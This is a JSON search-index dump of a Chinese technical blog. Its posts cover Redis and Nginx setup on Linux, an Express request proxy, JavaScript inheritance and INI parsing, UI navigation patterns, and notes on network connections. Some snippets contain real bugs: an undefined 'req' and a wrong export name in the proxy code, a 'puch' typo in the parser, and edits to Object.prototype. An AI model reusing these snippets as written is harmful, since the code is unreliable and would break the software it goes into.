1mongo","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"Linux Redis 安装并设置开机启动","slug":"Linux Redis 安装并设置开机启动","date":"2018-03-15T04:05:32.000Z","updated":"2024-09-21T02:47:02.572Z","comments":true,"path":"2018/03/15/Linux Redis 安装并设置开机启动/","permalink":"http://example.com/2018/03/15/Linux%20Redis%20%E5%AE%89%E8%A3%85%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/","excerpt":"","text":"安装 redis（注：以下是基于 linux 系统）进入源码目录（注：一般将下载的源码文件统一放在这个目录下，当然也可以不放这里，看个人需要）cd /usr/local/src 下载安装包wget http://download.redis.io/releases/redis-4.0.8.tar.gz注：此处假设最新版本为 4.0.8，如果不是要下载这个版本，则相应修改 解压安装包tar -zxvf redis-4.0.8.tar.gz 进入解压后的文件夹cd redis-4.0.8 创建安装目录（注：一般将程序统一安装在 &#x2F;usr&#x2F;local&#x2F; 目录下，当然也可以不放这里，看个人需要）mkdir /usr/local/redis 安装 redis 到以上目录make PREFIX=/usr/local/redis install 检查是否安装成功ls /usr/local/redis/bin如果安装成功，可以看到 bin 目录有以下文件redis-benchmarkredis-check-rdbredis-sentinelredis-check-aofredis-cliredis-server 设置开机自启动复制安装包中 utils 目录下的启动脚本文件 redis_init_script 到文件夹 &#x2F;etc&#x2F;init.d&#x2F; 并命名为 rediscp /usr/local/src/redis-4.0.8/utils/redis_init_script /etc/init.d/redis注：路径 &#x2F;usr&#x2F;local&#x2F;src&#x2F;redis-4.0.8 是按前面步骤的安装包解压后的位置，如果不是则相应修改； 编辑 &#x2F;etc&#x2F;init.d&#x2F;redis 文件打开文件vi /etc/init.d/redis 修改文件内容 第一段末尾添加如下内容 #chkconfig: 2345 80 90 EXEC&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;redis-server 改为 EXEC&#x3D;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin&#x2F;redis-server注：此处是设定执行文件的路径，以上路径是假设redis 安装的位置在 &#x2F;usr&#x2F;local&#x2F;redis，如果实际不是，则相应修改；以下两点同； CLIEXEC&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;redis-cli 改为 CLIEXEC&#x3D;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;bin&#x2F;redis-cli注：此处是设定客户端启动文件的路径； CONF&#x3D;”&#x2F;etc&#x2F;redis&#x2F;${REDISPORT}.conf” 改为 CONF&#x3D;”&#x2F;usr&#x2F;local&#x2F;redis&#x2F;conf&#x2F;${REDISPORT}.conf”注：此处是设定配置文件的路径；注意 redis 下的目录 conf 是要在下一步手工新增 保存退出新增配置文件存放目录mkdir /usr/local/redis/conf 复制安装包中的配置文件 redis.conf 到以上 conf 目录，并重命名为 6379.confcp /usr/local/src/redis-4.0.8/redis.conf /usr/local/redis/conf/6379.conf 编辑配置文件 6379.conf 打开文件 vi /usr/local/redis/conf/6379.conf 修改文件的后台运行选项 找到 daemonize no 那一行， 将其改为 daemonize yes 保存退出 修改启动脚本文件的执行权限chmod +x /etc/init.d/redis 设置开机启动chkconfig redis on 测试启动 redisservice redis start注：如果成功，会提示如下：Starting Redis server… Redis is running… 测试停止 redisservice redis stop 重启服务器reboot 测试客户端 redis-cli/usr/local/redis/bin/redis-cli注：如果成功，提示如下：127.0.0.1:6379","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"Node Express 转发 GET 和 POST 请求","slug":"Node Express 转发 GET 和 POST 请求","date":"2018-03-06T16:02:00.000Z","updated":"2024-09-21T09:13:44.477Z","comments":true,"path":"2018/03/07/Node Express 转发 GET 和 POST 请求/","permalink":"http://example.com/2018/03/07/Node%20Express%20%E8%BD%AC%E5%8F%91%20GET%20%E5%92%8C%20POST%20%E8%AF%B7%E6%B1%82/","excerpt":"","text":"转发GET 和 POST 请求到第三方的 API，实现方式如下，可单独建立一个 route.js 文件供 app.js 主程序文件引用 123456789// ---app.js--- 文件var express = require(&#x27;express&#x27;);var app = express();// 拦截带api字样的urlvar route = require(&#x27;./route.js&#x27;);app.use(&#x27;/api/*&#x27;, route); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// ---route.js 文件---var express = require(&#x27;express&#x27;);var http = require(&#x27;http&#x27;);//如果第三方api是https，则以上为var https = require(&#x27;https&#x27;)//下面的代码 http 处相应更改为 https，并将80端口更新为 443var router = express.Router();var _fn;var apiHost = &#x27;此处填写第三方 api 的域名&#x27; (例如: www.google.com)//转发 get 请求router.get(&#x27;/&#x27;, function(req, res, next)&#123; var path = req.originalUrl; _fn.getData(path, function(data)&#123; res.send(data); &#125;);&#125;);//转发 post 请求router.post(&#x27;/&#x27;, function(req, res, next)&#123; var path = req.originalUrl; var content = req.body; _fn.postData(path, content, function(data)&#123; res.send(data); &#125;);&#125;);_fn = &#123; getData: function(path, callback)&#123; http.get(&#123; hostname: apiHost, path: path &#125;, function(res)&#123; var body = []; res.on(&#x27;data&#x27;, function(chunk)&#123; body.push(chunk); &#125;); res.on(&#x27;end&#x27;, function()&#123; body = Buffer.concat(body); callback(body.toString()); &#125;); &#125;); &#125;, postData: function(path, data, callback)&#123; data = data || &#123;&#125;; content = JSON.stringify(data); var options = &#123; host: apiHost, port: 80, path: path, method: &#x27;POST&#x27;, headers:&#123; &#x27;Content-Type&#x27;: &#x27;multipart/form-data&#x27;, &#x27;Content-Length&#x27;: content.length //根据提交请求类型不同而不同，以上适用多媒体文件 //可查询各种报头类型代表的意思 &#125; &#125;; http.request(options, function(res)&#123; var _data = &#x27;&#x27;; res.on(&#x27;data&#x27;, function(chunk)&#123; _data += chunk; &#125;); res.on(&#x27;end&#x27;, function()&#123; callback(_data); &#125;); &#125;); req.write(content); req.end() &#125;&#125;;module.exports = route;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"阿里云轻量应用服务器 Nginx 缺少支持HTTPS 的 SSL-MODULE 问题","slug":"阿里云轻量应用服务器 Nginx 缺少支持HTTPS 的 SSL-MODULE 问题","date":"2018-03-04T01:28:46.000Z","updated":"2024-09-21T03:30:54.448Z","comments":true,"path":"2018/03/04/阿里云轻量应用服务器 Nginx 缺少支持HTTPS 的 SSL-MODULE 问题/","permalink":"http://example.com/2018/03/04/%E9%98%BF%E9%87%8C%E4%BA%91%E8%BD%BB%E9%87%8F%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%20Nginx%20%E7%BC%BA%E5%B0%91%E6%94%AF%E6%8C%81HTTPS%20%E7%9A%84%20SSL-MODULE%20%E9%97%AE%E9%A2%98/","excerpt":"","text":"阿里云轻量应用服务器预安装的 Nginx 默认没有 ssl-module，当需要使用 https 进行访问时，在配置 nginx.conf 并重启后，会提示如下： nginx: [emerg] the “ssl” parameter requires ngx_http_ssl_module in &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf 解决办法：在服务器上重装下载 nginx 相应版本的源码包（原因：镜像上面没有源码包；如有，则可不用重新下载，找到源码包所在目录即可），重新编译安装，过程步骤如下： 假设 nginx 安装在如下目录： &#x2F;usr&#x2F;local&#x2F;nginx 运行 cd sbin，进入 sbin 子目录，进入后当前目录为 &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin 运行 nginx -V，查看版本信息（目的：获取相同版本的源码包用），假设为 v1.12.1； 回到 &#x2F;usr&#x2F;local 目录， 运行 wget http://nginx.org/download/nginx-1.12.1.tar.gz，获取源码包 运行 tar zxvf nginx-1.12.1.tar.gz，解码 运行 cd nginx-1.12.1，进入包的目录 运行 ./configure --prefix=/usr/local/webserver/nginx --with-http_ssl_module，配置参数 运行 make，编译（注：不要 make install，避免覆盖原有的配置文件）； 运行 cp /usr/local/nginx/sbin/nginx ~/ （复制编译后的需要的新的可执行文件，避免覆盖原有的配置文件） 运行 cp objs/nginx /usr/local/nginx/sbin/（复制编译后的需要的新的可执行文件，避免覆盖原有的配置文件） 完成","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"阿里云轻量应用服务器远程连接 node 和 npm 命令不可用的问题","slug":"阿里云轻量应用服务器远程连接 node 和 npm 命令不可用的问题","date":"2018-03-04T01:12:38.000Z","updated":"2024-09-21T02:48:04.008Z","comments":true,"path":"2018/03/04/阿里云轻量应用服务器远程连接 node 和 npm 命令不可用的问题/","permalink":"http://example.com/2018/03/04/%E9%98%BF%E9%87%8C%E4%BA%91%E8%BD%BB%E9%87%8F%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%20node%20%E5%92%8C%20npm%20%E5%91%BD%E4%BB%A4%E4%B8%8D%E5%8F%AF%E7%94%A8%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"阿里云轻量应用服务器，有三种远程连接方式，分别如下： 其中阿里云推荐使用浏览器连接，但连接后，发现 node 和 npm 命令不可用，显示如下： 解决办法：改用本地 putty 客户端使用密钥进行连接","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"数据库查询并更新的锁定","slug":"数据库查询并更新的锁定","date":"2018-01-03T10:39:23.000Z","updated":"2024-09-21T02:49:37.510Z","comments":true,"path":"2018/01/03/数据库查询并更新的锁定/","permalink":"http://example.com/2018/01/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2%E5%B9%B6%E6%9B%B4%E6%96%B0%E7%9A%84%E9%94%81%E5%AE%9A/","excerpt":"","text":"方案一：使用 select for update 命令；方案二：在表中增加一个字段 version，int 类型，查询时，同时读取这个字段，更新时，判断这个字段与查询时获得的值相同，如果相同，更新记录并将 version 字段加1；如果不同，说明查询之后这条记录被更新过了，需要报错并另外处理；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"交互设计模式：导航-面包屑","slug":"交互设计模式：导航-面包屑","date":"2017-11-15T14:06:06.000Z","updated":"2024-09-21T02:49:02.524Z","comments":true,"path":"2017/11/15/交互设计模式：导航-面包屑/","permalink":"http://example.com/2017/11/15/%E4%BA%A4%E4%BA%92%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9A%E5%AF%BC%E8%88%AA-%E9%9D%A2%E5%8C%85%E5%B1%91/","excerpt":"","text":"问题场景在层级结构中，用户需要知道他所处的位置，以及能够返回上一级 解决方法使用面包屑，展示出各个级别（从顶级到当前级），并允许对每一级进行点击跳转 适用场景 网站有多层级结构（不少于3级）； 中型到大型的网站，如电商、产品目录、入口网站（如网址导航）、企业网站； 配合主导航，主导航允许用户跨越不同分支； 需要一次性回退多个层级，而非逐级回退； 用户不熟悉网站的层级； 设计要点 路径显示当前页面所在的层级结构；每一层级使用一个标签，做成可点击的链接； 当面页面的标签要突出标注，并且不可点击（以便让用户知道所处的位置）； 不要用当前页的标签，做为本页面的唯一标题，需要单独再放置一个标题； 层级间使用&#x2F;或&gt;进行区隔； 如果路径很长，中间可以使用省略号…隐藏部分内容； 路径单独放置在一块区域中，占据整个内容页面的宽度 放置在靠近内容的区域，建议在内容之上，内容标题之下； 利弊分析 面包屑可以告诉用户所在的位置，并展示出网站的层级，方便用户认知； 占据空间小，能够留更多空间给内容； 使用链接式标签，使用户可以层级间跳跃浏览； 面包屑不做为主导航，需要配合主导航使用； 用户测试显示面包屑很少出现麻烦，总会有部分用户使用，因此可以说有益无害； 创意改进面包屑结合飞出菜单，用来展示标签下的次级导航；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"交互设计模式：导航-手风琴","slug":"交互设计模式：导航-手风琴","date":"2017-11-14T14:17:37.000Z","updated":"2024-09-21T02:49:20.386Z","comments":true,"path":"2017/11/14/交互设计模式：导航-手风琴/","permalink":"http://example.com/2017/11/14/%E4%BA%A4%E4%BA%92%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%9A%E5%AF%BC%E8%88%AA-%E6%89%8B%E9%A3%8E%E7%90%B4/","excerpt":"","text":"问题场景 用户想通过导航找到某个项目 解决方法 使用手风琴导航，将多个面板垂直或者水平叠加到一起，展开其中一个面板，缩起其他面板； 适用场景 常做为主导航或者次级导航； 本质上类似标签导航；可做为导航树的替代方案； 经常有人在操作向导中使用手风琴，但其实并不合适； 用在FAQ非常合适； 如果设置项目不多的话（少于10个），用来管理设置项也不错； 设计要点 一次只展开一个面板（如果可以展开多个，则叫做导航树或可关闭面板）； 通过点击面板头部来切换不同的面板； 垂直手风琴展开后，一般展示次级项目；水平手风琴则可以放置大段内容； 注意事项 适当的动画效果，以便让用户知道发生了什么事情（动画时间少于250ms） 支持键盘上下方向键； 展开的面板应高亮显示，以便与缩起的面板进行区分； 确保面板尺寸能够根据内容自适应，因为如果高度固定，当内容项很少于，会导致面板很空； 利弊分析 优点：可以将大量元素压缩在有限的空间内进行展示；元素包括：次级项目、问题、属性； 缺点：做为主导航时，大部分元素被隐藏，可见性较弱 其他 垂直排列的方式很常见，但动画效果经常做得不好；水平式很少见，但可以带来一些乐趣；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"js 函数作为参数不带括号","slug":"js 函数作为参数不带括号","date":"2017-11-12T09:33:00.000Z","updated":"2024-09-21T03:24:49.466Z","comments":true,"path":"2017/11/12/js 函数作为参数不带括号/","permalink":"http://example.com/2017/11/12/js%20%E5%87%BD%E6%95%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%E4%B8%8D%E5%B8%A6%E6%8B%AC%E5%8F%B7/","excerpt":"","text":"将函数做为参数传递给另外一个函数时，该函数不用写括号，原因：如果写了括号，相当于把函数的执行返回结果，做为参数传入，而不是传入一个函数对象本身了。 function A(); function B(func, args); // 注意区分B(A, args) 和 B(A(), args) 二者的区别；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"js 类的继承","slug":"js 类的继承","date":"2017-11-12T09:31:02.000Z","updated":"2024-09-21T09:14:29.692Z","comments":true,"path":"2017/11/12/js 类的继承/","permalink":"http://example.com/2017/11/12/js%20%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF/","excerpt":"","text":"方法一：通过使用构造函数，prototype，inherit 和 method 方法来实现类的继承； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//定义一个通用的 clone 函数，用来克隆一个新对象，该新对象以参数传入 的对象为原型；function clone(object)&#123; function OneShotConstructor()&#123;&#125;; OneShotConstructor.prototype = object; // 将对象做为构造函数的原型； return new OneShotConstructor();&#125;//定义 inherit 和 method 方法// 通过参数传入构造函数，以其原型克隆出一个对象，并将其作为当前对象的原型，实现了继承；Object.prototype.inherit = function(baseConstructor)&#123; this.prototype = clone(baseConstructor.prototype); this.prototype.constructor = this;&#125;// 给对象定义了一些 method 的方法，该方法使得对象可以将传入的函数，添加成为它自己的方法；Object.prototype.method = function(name, func)&#123; this.prototype[name] = func;&#125;//写个例子function Item(name)&#123; this.name = name;&#125;;Item.prototype.inspect = function()&#123; alert(&quot;It is &quot; + this.name + &quot;.&quot;);&#125;;Item.prototype.kick = function()&#123; alert(&quot;Klunk!&quot;);&#125;;Item.prototype.take = function()&#123; alert(&quot;you cannot lift &quot; + this.name + &quot;.&quot;);&#125;;var lantern = new Item(&quot;the brass lantern&quot;);function DetailedItem(name, details)&#123; this.name = name; this.details = details;&#125;;DetailedItem.inherit(Item);DetailedItem.method(&quot;inspect&quot;, function()&#123; alert(&quot;you see &quot; + this.name + &quot;,&quot; + this.details + &quot;.&quot;);&#125;);var giantSloth = new DetailedItem(&quot;the giant sloth&quot;, &quot;it is quietly hanging from a tree, munching leaves&quot;); function SmallItem(name)&#123; this.name = name;&#125;;SmallItem.inherit(Item);SmallItem.method(&quot;kick&quot;, function()&#123; alert(this.name + &quot; files across the room.&quot;);&#125;);SmallItem.method(&quot;take&quot;, function()&#123; alert(&quot;you take &quot; + this.name + &quot;.&quot;);&#125;);var pencil = new SmallItem(&quot;the red pencil&quot;);pencil.kick(); 方法二：把原型放到一个对象中做为类，然后通过 create 方法来实例化，通过 extend 来创建子类；这种方法的好处是可以忽略 prototype 的使用；123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566//定义 extend 和 create 方法// 给对象定义了一个 create 方法，该方法使得对象可以复制一个子对象出来；并且这个子对象还会// 根据传入的参数，调用继承自父对象的 construct 方法，进行自己的初始化；Object.prototype.create = function()&#123; var object = clone(this); if (object.construct != undefined) object.construct.apply(object, arguments); return object;&#125;// 给对象定义了一个 extend 方法，该方法会创建一个子对象，并将传入的对象的所有属性，复制一份到子对象上；Object.prototype.extend = function(properties)&#123; var result = clone(this); forEachIn(properties, function(name, value)&#123; result[name] = value; &#125;); return result;&#125;//写个相同的例子var Item = &#123; construct: function(name)&#123; this.name = name; &#125;, inspect: function()&#123; alert(&quot;It is &quot; + this.name + &quot;.&quot;); &#125;, kick: function()&#123; alert(&quot;Klunk!&quot;); &#125;, take: function()&#123; alert(&quot;You cannot lift &quot; + this.name + &quot;.&quot;); &#125;&#125;var lantern = Item.create(&quot;the brass lantern&quot;);var DetailedItem = Item.extend(&#123; construct: function(name, details)&#123; Item.construct.call(this, name); this.details = details; &#125;, inspect: function()&#123; alert(&quot;you see &quot; + this.name + &quot;,&quot; + this.details + &quot;.&quot;); &#125;&#125;);var giantSloth = DetailedItem.create(&quot;the giant sloth&quot;, &quot;it is quietly hanging from a tree, munching leaves&quot;); var SmallItem = Item.extend(&#123; kick: function()&#123; alert(this.name + &quot; files across the room.&quot;); &#125;, take: function()&#123; alert(&quot;you take &quot; + this.name + &quot;.&quot;); &#125;&#125;);var pencil = SmallItem.create(&quot;the red pencil&quot;);pencil.take(); 总结：不管是第1种的 inherit 方法，还是第二种的 create 方法，它们都是通过将父对象做子对象的原型来实现的继承，区别在后者对 prototype 的使用进行了封装，不需要老是打 protoype 这个单词， 降低了出错概率，更好的实现了概念的抽象；","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"js 解析 ini 文件","slug":"js 解析 ini 文件","date":"2017-11-12T09:27:12.000Z","updated":"2024-09-21T09:14:20.967Z","comments":true,"path":"2017/11/12/js 解析 ini 文件/","permalink":"http://example.com/2017/11/12/js%20%E8%A7%A3%E6%9E%90%20ini%20%E6%96%87%E4%BB%B6/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536// 解析 ini 文件function splitLines(string)&#123; return string.split(/\\r?\\n/);&#125;function parseINI(string)&#123; var lines = splitLines(string); var categories = []; function newCategory(name)&#123; var cat = &#123;name: name, fields: []&#125;; categories.push(cat); return cat; &#125; var currentCategory = newCategory(&quot;TOP&quot;); forEach(lines, function(line)&#123; var match; if (/^\\s*(;.*)?$/.test(line))&#123; return; &#125; else if (match = line.match(/^\\[(.*)\\]$/))&#123; currentCategory = newCategory(match[1]); &#125; else if (match = line.match(/^(\\w+)=(.*)$/))&#123; currentCategory.fields.puch(&#123;name: match[1], value: match[2]&#125;); &#125; else&#123; throw new Error(&quot;Invalid line: &quot; + line); &#125; &#125;); return categories;&#125;","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"js 如何避免使用全局变量","slug":"js 如何避免使用全局变量","date":"2017-11-12T09:01:38.000Z","updated":"2024-09-21T03:24:59.106Z","comments":true,"path":"2017/11/12/js 如何避免使用全局变量/","permalink":"http://example.com/2017/11/12/js%20%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F/","excerpt":"","text":"为了避免使用全局变量，有两个办法 办法一：设计一个函数，并将函数内的方法添加到全局对象 window 上（这种方法虽然可以避免全局变量，却难免要应对全局对象上方法的命名冲突） 办法二：设计一个对象，对象里面存着变量和方法，但它不直接通过定义获得（不然会变成全局变量），而是通过定义匿名函数并马上运行它来返回所需要的对象","categories":[],"tags":[{"name":"软件","slug":"软件","permalink":"http://example.com/tags/%E8%BD%AF%E4%BB%B6/"},{"name":"javascript","slug":"javascript","permalink":"http://example.com/tags/javascript/"}]},{"title":"网络是怎样连接的","slug":"网络是怎样连接的","date":"2017-11-12T09:01:38.000Z","updated":"2024-09-21T10:30:53.654Z","comments":true,"path":"2017/11/12/网络是怎样连接的/","permalink":"http://example.com/2017/11/12/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84/","excerpt":"","text":"前言 浏览器生成消息生成 HTTP 请求消息从输入网址开始URL 网址开头部分为协议，常见协议有： http：访问远程 Web 服务器，例如：http://user:password@www.glass.com:80/dir/file1.html，注意 URL 中可携带用户名和密码，一般都为可省略 ftp：下载或上传文件；同样可以携带用户名和密码（可省略）； file：读取本地文件； mailto：发送电子邮件；例如：mailto:&#x74;&#x6f;&#110;&#x79;&#x40;&#103;&#x6c;&#97;&#x73;&#x73;&#46;&#x63;&#x6f;&#109;，冒号后的部分为邮件地址； news：阅读新闻组的文章，例如：news: comp.protocols.tpc-ip，冒号后的部分为新闻组名称； 浏览器先解析 URL 省略文件名的情况 http://www.lab.glass.com/dir/，末尾有斜杠，但没有文件名，因此访问目录中的默认文件，一般名称为 index.html 或者 default.html； http://www.lab.glass.com/dir，末尾没有斜杠，先将 dir 作为文件名来处理，如果找不到，再将其当作目录名来处理； HTTP 的基本思路HTTP 是发送数据的一种报文格式规范，由报头和消息体两部分组成，报头是必须的，消息体根据情况是可选的；消息体的格式可以有很多种，以支持不同形式的数据，格式在头部的 content-type 字段中备注； 报头由必要的请求行（首行）和一些可选的字段组成。首行的信息有： 方法：GET，POST，PUT 等； URI：资源路径，例如 &#x2F;dir&#x2F;file.html； 协议版本：例如 HTTP1.1 生成 HTTP 请求消息 发送请求后会收到响应响应的格式和请求基本一致，也是由报头+可选的消息体组成，报头由响应行+可选的头字段组成；响应行由协议版本+状态码+说明组成，例如 HTTP&#x2F;1.1 200 OK； 向 DNS 服务器查询 Web 服务器的 IP 地址IP 地址的基本知识整个互联网实际上是由各种小的局域网组成的。每个小的局域网络通过一台路由器对外发放和接受数据，内部则由路由器为各终端设备分配内部 IP 地址进行管理； 域名和 IP 地址并用的理由IP 地址不好记，而且同一个网站可能会有多个 IP 地址，同时由于设备的宕机和维护，IP 地址还会变动，因此使用人们更容易记住的域名来访问网站是一种更加健壮的方案； Socket 库提供查询 IP 地址的功能操作系统内置的 socket 库提供了查询 IP 地址的功能，这样应用程序只需直接调用该库的功能，即可将域名解析成 IP 地址； 通过解析器向 DNS 服务发出查询由于 socket 是使用 C 语言编写的，让它被调用时，实际的过程是预先分配一段内部，用来存储后续的结果，然后解析器向 DNS 服务器发出请求，并在得到解析结果后，将其写入预先分配的内存地址中； 域名解析：resolution，解析器：resolver 解析器的内部原理 DNS 服务器的地址可以有多个来源，例如： 由 ISP 运营商提供； 由用户手工在路由器中提供； 由用户手工在网卡的属性中进行设置； 全世界 DNS 服务器的大接力DNS 服务器的基本工作DNS 服务器的工作本质即使就是维护一张域名和 IP 地址的映射记录表。当收到一个域名解析请求后，就在表中分组查询询对应类型的 IP 地址。如果找不到，就将请求转发给下级域名的服务器进行查找； 注意：这里有一个很重要的点，即 DNS 服务器的解析是分级。不同级的映射记录有可能存储在同一台服务器上面，也有可能存储在不同的服务器上面；另外解析记录还区分类型，例如 A 类型，MX 邮件类型，CNAME 别名类型等； 域名的层次结构域名是分层次的，每一层使用点号隔开，例如 www.baidu.com.cn，其中 cn 是国家级别的域名，com 是商业类型域名，baidu 则是域名申请者的自定义名称，www 是域名申请者的内部子域名； 寻找相应的 DNS 服务器并获取 IP 地址 通过缓存加快 DNS 服务器的响应 为了加快响应速度，一般 DNS 服务器上面有会缓存机制，将最近的查询结果缓存起来，这样再收到相同的解析请求时，就可以立即返回结果，而无须再次对外发起请求了； 委托协议栈发送消息数据收发操作概览 创建套接字阶段套接字本质上其实是一个存在于内存中的对象，该对象有多个字段，每个字段存放着管理连接的有关信息，例如 IP 地址、连接状态等；因为网络在本质上是不可靠的，数据在传输过程中会出现丢失或中断，因此需要在本地记录当前的连接状态，这样当发生意外时，仍然能够正常工作； 当应用程序调用 socket 库创建套接字后，被调用的函数会返回一个文件描述符，用来代表该套接字对象，这样应用程序后续的操作，都可以向读写文件一样，与套接字对象进行交互； 连接阶段‘连接’相对当于客户端和服务器之间的一种准备工作，对方交换一下必要的信息和状态，例如起始字节等；交换成功后，即表示网络是畅通的，并进入了可通信的阶段； 由于套接字返回的文件描述符是本地的，因此无法在本机之外使用。因此需要使用端口号来解决这个问题，因为一台机器上，不管是本地计算机，还是远程服务器，正常都会有多个应用程序进行互联网通信，因此需要使用端口号机制来区分不同的应用程序； 通信阶段当连接成功后，应用程序即可调用 socket 库中的 write 函数，将数据写入套接字返回的文件描述符，并使用 read 函数远程服务器返回的响应； 断开阶段当客户端收到服务器返回的响应后，本次连接即告结束，但这时不一定马上调用 close 函数断开连接，有两方面的原因： 有可能在返回的响应中，发现需要额外的请求数据，例如网页上的图片； 有可能应用程序没有马上读取返回的数据，如果马上释放文件描述符，又恰好被操作系统分配给了另外的应用程序，会导致原应用程序无法读取到数据，或者其他应用程序读取到本不属于自己的数据； 用电信号传输 TCP&#x2F;IP 数据创建套接字协议栈的内部结构 套接字的实体就是通信控制信息套接字的本质就是内存中存放着的一段类似对象的数据结构，该数据结构保存着控制整个连接的各项重要信息，例如连接的源地址、目标地址、端口号、各种连接状态等；各个 socket 函数在需要的时候，就会从该对象读取所需要的信息，来完成自身的工作。并在工作完成后，改写信息，标记最新的状态； 调用 socket 时的操作 连接服务器连接是什么意思所谓连接实际是在做建立通信的初始化动作，这些动作包括准备好发送方和接收方的 IP 地址、端口号、状态、内存分配、MAC 地址等事宜； 负责保存控制信息的头部TCP 协议报文的头部数据来源于在上一步的连接阶段初始化好的那些数据（存放在 socket 对象中），主要字段如下： 发送方的端口号：16bit 接收方的端口号：16bit 序号：32bit，告知对方当前发送的数据包在所有数据包中的序号； ACK 号：32bit，告知对方已经收到哪个序号的包了，因此一般是接收方发给发送方才使用； 数据偏移量：4bit，告知对方主体数据在当前数据包的起始位置，因此变相也是头部的长度； 保留字段：6bit 控制位：6bit，告知对方连接指令，包括 RST：告知对方将强制断开连接 SYN：告知对方将建立连接； FIN：告知对方将断开连接； 窗口：16bit，告知对方当前可用窗口大小； 校验和：16bit，方便对方检查数据是否有错误 紧急指针：16bit，告知对方应紧急处理的数据位置（说实话暂时不知道有啥使用场景）； 可选字段：长度不固定，较少使用； 连接操作的实际过程 客户端的 TCP 模块从 socket 对象中读取需要的值，组成 TCP 报文头部。之后由 IP 模块接手，添加 IP 报文头部，最后交给网卡驱动程序，将数据转成电信号发送出去（此阶段会告知服务端自己的 ACK 序号初始值和窗口大小）。 服务端的网卡驱动程序接收到电信号，转成数据后交给 IP 模块解析出 TCP 报文，之后再转给 TCP 进一步解析出数据；服务端按相同的方式发送报文给客户端（此阶段会告知客户端自己的 ACK 序号初始值和窗口大小）； 客户端收到后，将 socket 对象中的 syn 字段值更新为 1，表示客户端到服务端的通信建立成功；并再次发送 ACK 报文给服务端； 服务端收到后，也将其 socket 对象中的 syn 字段值更新为1，表示服务端到客户端的通信建立成功； 收发数据将 HTTP 请求消息交给协议栈协议栈并不关心所要发送的内容是什么，无论内容是什么，都看作是一定长度的二进制序列即可； 由于协议栈无法预知应用程序是一次性将数据全部给过来，还是分多次给。因此，在收到数据后，它不一定马上将数据发送出去，而是先将数据放到缓冲区中，然后根据情况来处理； 如果收到的数据大于或接近包的最大数据容量（MSS，MTU 扣减头部后的值），则马上将数据发出去，因为多等也无意义； 如果收到的数据小于包的最大容量，则看一下计时器，是否超过了最长可等待时间： 如果没超过，就再等等； 如果超过了，就把包发出去，即使还没有满； 